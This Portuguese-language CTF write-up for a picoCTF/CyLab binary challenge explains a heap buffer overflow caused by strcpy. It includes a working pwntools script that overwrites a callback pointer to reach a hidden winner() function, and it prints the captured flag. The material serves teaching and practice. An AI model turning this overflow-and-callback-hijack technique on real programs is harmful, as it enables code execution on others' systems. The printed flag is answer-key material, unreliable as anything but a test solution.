# Heap Havoc

**Autor:** Yahaya Meddy
**Plataforma:** CyLab (picoCTF)
**Categoria:** Binary Exploitation
**Dificuldade:** Difícil
**Data:** 2026

**Descrição do desafio:** 
> A seemingly harmless program takes two names as arguments, but there's a catch. Each name is copied onto the heap without a length check, so overflowing one reaches whatever the allocator placed after it — and from there you can redirect execution to a hidden part of the binary that prints the flag.

---

## 1. Análise do arquivo fornecido

O desafio entrega o código-fonte `vuln.c` e o binário `vuln`. O programa pede dois nomes e os copia para o heap, sem verificar o tamanho. A função `winner()` existe, mas nunca é chamada. O objetivo é fazer o programa executá-la.

O binário tem as seguintes características:

- ELF 32 bits, não-PIE: os endereços são fixos.
- `winner()` fica em `0x08049206`.
- A variável `completed.0`, em `.bss`, fica em `0x0804c040`.

A parte relevante de `main()`:

```c
i1 = malloc(sizeof(struct internet));
i1->priority = 1;
i1->name = malloc(8);
i1->callback = NULL;

i2 = malloc(sizeof(struct internet));
i2->priority = 2;
i2->name = malloc(8);
i2->callback = NULL;

strcpy(i1->name, argv[1]);
strcpy(i2->name, argv[2]);

if (i1->callback) i1->callback();
if (i2->callback) i2->callback();
```

A `struct internet` tem três campos: `priority` (int), `name` (ponteiro) e `callback` (ponteiro para função).

---

## 2. Identificando a vulnerabilidade

O `strcpy(i1->name, argv[1])` copia a entrada inteira para um buffer de 8 bytes, sem checar o tamanho. Isso é um **heap buffer overflow**.

Como as alocações são pequenas e feitas em sequência, no glibc de 32 bits os chunks têm 16 bytes cada. Logo, a struct `i2` fica logo depois do buffer `i1->name`:

```
offset 0..15  : i1->name (preenchimento)
offset 16..19 : i2->priority
offset 20..23 : i2->name      <- usado depois pelo strcpy(i2->name, argv[2])
offset 24..27 : i2->callback  <- sobrescrito com o endereço de winner()
```

Duas restrições aparecem nesse ponto:

1. Não dá para deixar `i2->name` com um valor arbitrário. O segundo `strcpy` escreveria `argv[2]` no endereço que estiver ali. Por isso apontamos `i2->name` para `completed.0` (`0x0804c040`), um byte de `.bss` que não afeta o programa.
2. O payload não pode conter byte nulo nem espaço, porque o `strcpy` pararia antes da hora e o servidor lê os nomes separados por espaço.

Como `winner()` só é chamada através do `callback`, o desvio acontece quando `if (i2->callback)` for executado. Como `i1->callback` continua `NULL`, ele não é chamado.

---

## 3. Exploit final

O payload tem:

- 16 bytes de preenchimento (`A`);
- 4 bytes para `priority` (`BBBB`);
- o endereço de `completed.0`, para `i2->name`;
- o endereço de `winner()`, para `i2->callback`.

Ao rodar, o servidor pede os dois nomes numa única linha. O segundo nome é `x`, que é gravado em `completed.0` sem efeito colateral relevante.

```python
from pwn import *
import struct

HOST = "xebec.cylabacademy.net"
PORT = 40805
WINNER = 0x08049206
COMPLETED = 0x0804c040

payload = b"A"*16 + b"BBBB" + struct.pack("<II", COMPLETED, WINNER)

p = remote(HOST, PORT)
p.recvuntil(b"Enter two names separated by space:")
p.sendline(payload + b" x")
print(p.recvall(timeout=3).decode(errors="ignore"))
p.close()
```

## Flag

```
academy{h34p_0v3rfl0w_22fcc088}
```

---

**Autora da WriteUp:** [Membro de Exploitation - lieserl](https://github.com/lieserl-git)
